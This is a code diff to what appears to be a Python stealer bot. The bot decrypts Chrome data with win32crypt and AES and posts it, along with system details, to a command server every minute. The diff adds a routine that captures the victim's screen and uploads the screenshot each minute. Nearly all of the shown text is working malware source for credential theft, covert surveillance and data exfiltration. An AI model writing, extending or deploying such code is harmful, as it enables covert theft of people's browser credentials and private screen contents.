@@ -11,22 +11,25 @@ import shutil
 import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
+from PIL import ImageGrab
 
 APP_DATA = os.environ['LOCALAPPDATA']
 API_URL = "http://localhost:4000"
 CONFIG_PATH = "config.txt"
+SCREENSHOT_PATH = "screenshot.jpg"
 
 class b64():
     def encrypt(self, text):
-        return base64.b64encode(text.encode('utf-8')).decode('utf-8')
+        return base64.b64encode(text.encode("utf-8")).decode("utf-8")
 
     def decrypt(self, text):
-        return base64.b64decode(text.encode('utf-8')).decode('utf-8')
+        return base64.b64decode(text.encode("utf-8")).decode("utf-8")
 
 class ApiController():
     def __init__(self):
         self.api_url = API_URL
-    
+        self.screenshot_path = SCREENSHOT_PATH
+
     def check_connection(self):
         try:
             r = requests.get(self.api_url)
@@ -86,6 +89,15 @@ class ApiController():
 
                 requests.post(f"{self.api_url}/update/chrome/{identifier}", json=post_data)
 
+    def update_screenshot(self, identifier, token):
+        if self.check_connection():
+            image = ImageGrab.grab()
+            image.save(self.screenshot_path)
+            
+            post_file = {"file": (self.screenshot_path, open(self.screenshot_path, "rb"))}
+
+            requests.post(f"{self.api_url}/update/screenshot/{identifier}/{token}", files=post_file)
+
 class FileController():
     def __init__(self):
         self.config_path = CONFIG_PATH
@@ -110,7 +122,7 @@ class FileController():
             l = f.split(":")
             return [l[0], l[1]]
         else:
-            return False
+            return False 
 
 class Chrome(object):
     def __init__(self):
@@ -183,6 +195,8 @@ def main():
                 if api.check_account(bot_identifier, bot_token):
                     schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
                     schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
+                    schedule.every(1).minutes.do(api.update_screenshot, bot_identifier, bot_token)
+
                     while True:
                         schedule.run_pending()
                         time.sleep(1)
